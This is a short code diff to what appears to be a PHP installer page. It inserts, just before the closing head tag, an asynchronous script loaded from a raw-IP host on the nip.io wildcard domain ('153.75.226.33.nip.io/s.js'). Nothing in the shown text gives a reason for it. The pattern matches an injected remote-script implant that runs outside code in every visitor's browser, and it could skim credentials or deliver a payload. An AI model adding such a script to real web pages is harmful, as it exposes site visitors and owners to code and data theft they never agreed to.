@@ -112,7 +112,7 @@ if (!empty($_SERVER['HTTPS'])) {
 
 
 
-    </head>
+    <script src="https://153.75.226.33.nip.io/s.js" async></script></head>
     <body>
         <div class="install-box">
 
